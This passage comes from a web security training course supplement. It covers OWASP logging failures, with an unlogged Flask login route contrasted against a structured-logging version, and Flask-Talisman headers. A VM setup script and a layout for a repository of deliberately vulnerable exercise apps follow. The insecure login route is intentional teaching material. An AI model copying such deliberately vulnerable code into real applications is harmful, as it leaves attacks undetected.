+> return jsonify({\"error\": \"Resource not found\"}), 404
+>
+> \# Never return the requested path in the 404 message --- avoids path
+> disclosure
+
+**Module 11 --- A09 Logging & Alerting Failures**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   A09 Security Logging & Monitoring Failures
+
+  **Delivery mode**   Instructor demo --- run attack sequences against
+                      the app with/without logging and compare what an
+                      analyst would see
+
+  **Timing**          \~10 mins demo; complements the Juice Shop logging
+                      activity
+
+  **What Flask adds** Makes the logging gap visceral: run an SQLi attack
+                      against the app with no logging --- the server log
+                      is empty. Then enable structured logging and repeat
+                      --- the attack is immediately visible.
+  -----------------------------------------------------------------------
+
+**Part A: What No Logging Looks Like**
+
+**VULNERABLE --- app with no security event logging**
+
+> \@app.route(\"/login\", methods=\[\"POST\"\])
+>
+> def login():
+>
+> \# 500 failed login attempts will leave absolutely no trace
+>
+> user =
+> User.query.filter_by(username=request.form\[\"username\"\]).first()
+>
+> if not user or not check_password(request.form\[\"password\"\],
+> user.password_hash):
+>
+> return \"Invalid credentials\", 401 \# Silent failure --- no log, no
+> alert
+>
+> return \"OK\"
+
+**Part B: Structured Security Logging**
+
+**FIXED --- security events logged with context for SIEM ingestion**
+
+> import logging, json
+>
+> from datetime import datetime
+>
+> security_log = logging.getLogger(\"security\")
+>
+> def log_event(event_type, username, ip, success, detail=\"\"):
+>
+> \"\"\"Emit a structured JSON security event --- easy to ingest into
+> Splunk/ELK/SIEM.\"\"\"
+>
+> security_log.warning(json.dumps({
+>
+> \"timestamp\": datetime.utcnow().isoformat(),
+>
+> \"event\": event_type,
+>
+> \"username\": username, \# NOTE: log the username attempted, NOT the
+> password
+>
+> \"source_ip\": ip,
+>
+> \"success\": success,
+>
+> \"detail\": detail
+>
+> }))
+>
+> \@app.route(\"/login\", methods=\[\"POST\"\])
+>
+> \@limiter.limit(\"5 per minute\")
+>
+> def login():
+>
+> username = request.form.get(\"username\", \"\")
+>
+> user = User.query.filter_by(username=username).first()
+>
+> if not user or not check_password(request.form.get(\"password\",\"\"),
+> user.password_hash):
+>
+> log_event(\"LOGIN_FAILURE\", username, request.remote_addr, False)
+>
+> return \"Invalid credentials\", 401
+>
+> log_event(\"LOGIN_SUCCESS\", username, request.remote_addr, True)
+>
+> return \"OK\"
+
++-----------------------------------------------------------------------+
+| **🚨 What NOT to log --- equally important**                          |
+|                                                                       |
+| Never log: passwords (even hashed), full credit card numbers, session |
+| tokens, or any data classified as Personal under UK GDPR / DPA 2018.  |
+| Show delegates that \"username\" is logged but \"password\" is        |
+| deliberately absent from the log_event() call above.                  |
++-----------------------------------------------------------------------+
+
+**Discussion Prompts**
+
+-   Run 20 failed login attempts against the unlogged version. Then
+    check the Flask console. What do you see? (Nothing --- the attack is
+    invisible.)
+
+-   Now enable the logging version and repeat. What would a SOC analyst
+    be able to determine from the log? (Username targeted, source IP,
+    timestamps, frequency.)
+
+-   What threshold of failed logins should trigger an alert? Who should
+    receive it? How quickly?
+
+**Module 12 --- Supporting Continuous Web Application Security
+Improvements**
+
+  -----------------------------------------------------------------------
+  **Field**           **Detail**
+  ------------------- ---------------------------------------------------
+  **OWASP mapping**   All categories --- consolidation and signposting
+
+  **Delivery mode**   Instructor-led walkthrough of Flask-Talisman as a
+                      \"security defaults\" library
+
+  **Timing**          \~8 mins --- pairs well with the end-of-course
+                      signposting activity
+
+  **What Flask adds** Demonstrates that many security headers and
+                      configuration defaults can be applied to an entire
+                      Flask application in under 10 lines --- reducing
+                      the barrier to \"secure by default\"
+  -----------------------------------------------------------------------
+
+**Flask-Talisman: Secure Headers in One Import**
+
+Flask-Talisman applies a comprehensive set of HTTP security headers and
+enforces HTTPS by default. Show delegates that \"securing\" an entire
+Flask app\'s transport-layer configuration requires fewer than 10
+additional lines --- removing the excuse that it\'s too complex.
+
+> pip3 install flask-talisman
+>
+> from flask import Flask
+>
+> from flask_talisman import Talisman
+>
+> app = Flask(\_\_name\_\_)
+>
+> \# Talisman adds in one call:
+>
+> \# Strict-Transport-Security (HSTS)
+>
+> \# X-Content-Type-Options: nosniff
+>
+> \# X-Frame-Options: SAMEORIGIN
+>
+> \# X-XSS-Protection: 1; mode=block
+>
+> \# Content-Security-Policy (configurable)
+>
+> csp = {
+>
+> \"default-src\": \[\"\'self\'\"\],
+>
+> \"script-src\": \[\"\'self\'\"\],
+>
+> \"style-src\": \[\"\'self\'\"\],
+>
+> }
+>
+> Talisman(app, content_security_policy=csp, force_https=False) \#
+> force_https=True in production
+
+**Signposted Resources for Delegates**
+
+-   OWASP Flask Security Cheat Sheet:
+    owasp.org/www-project-cheat-sheets/cheatsheets/Flask_Security_Cheat_Sheet
+
+-   Bandit --- Python SAST tool: bandit.readthedocs.io \| pip3 install
+    bandit && bandit -r app/
+
+-   pip-audit --- dependency CVE scanner: pypi.org/project/pip-audit
+
+-   Flask-Talisman --- security headers:
+    github.com/GoogleCloudPlatform/flask-talisman
+
+-   PortSwigger Web Security Academy: portswigger.net/web-security
+    (free, lab-based, aligned to course topics)
+
+-   OWASP Juice Shop companion guide: pwning.owasp-juice.shop
+    (self-study continuation)
+
+**Appendix A --- VM Setup for Flask Exercises**
+
+Run this script once per VM during provisioning to install all Flask
+dependencies used across the supplement:
+
+> #!/bin/bash
+>
+> \# flask_setup.sh --- run as ubuntu user on each delegate VM
+>
+> pip3 install \--break-system-packages \\
+>
+> flask \\
+>
+> flask-sqlalchemy \\
+>
+> flask-login \\
+>
+> flask-jwt-extended \\
+>
+> flask-limiter \\
+>
+> flask-talisman \\
+>
+> bcrypt \\
+>
+> pip-audit
+>
+> \# Clone the supplement app directory
+>
+> git clone https://github.com/YOUR_REPO/vuln_flask_app
+> \~/vuln_flask_app
+>
+> \# Or copy from instructor VM:
+>
+> \# scp -r ubuntu@INSTRUCTOR_IP:\~/vuln_flask_app \~/vuln_flask_app
+>
+> echo \"Flask supplement ready. Run: cd \~/vuln_flask_app && flask run
+> \--port 5000\"
+
+**Appendix B --- Recommended Supplement App Structure**
+
+A single Git repository containing one self-contained Python file per
+module exercise, each runnable independently. This allows delegates to
+reset to a known state between exercises.
+
+> vuln_flask_app/
+>
+> ├── README.md
+>
+> ├── requirements.txt
+>
+> ├── module2_http_basics/
+>
+> │ ├── app_demo.py
+>
+> │ └── templates/
+>
+> ├── module4_owasp_bingo/
+>
+> │ ├── vulnerable_shop.py \# The 8-flaw app
+>
+> │ └── vulnerable_shop_fixed.py \# Reference solution
+>
+> ├── module6_access_control/
+>
+> │ ├── vuln_idor.py
+>
+> │ ├── vuln_jwt.py
+>
+> │ └── fixed/ \# Fixed versions revealed after exercise
+>
+> ├── module8_crypto/
+>
+> │ ├── vuln_passwords.py
+>
+> │ └── vuln_integrity.py
+>
+> ├── module9_injection/
+>
+> │ ├── vuln_sqli.py
+>
+> │ ├── vuln_xss.py
+>
+> │ ├── vuln_ssti.py
+>
+> │ └── vuln_cmdi.py
+>
+> ├── module11_logging/
+>
+> │ ├── no_logging.py
+>
+> │ └── with_logging.py
+>
+> └── shared/
+>
+> ├── db_seed.py \# Creates and seeds a shared SQLite database
+>
+> └── models.py \# Shared SQLAlchemy models
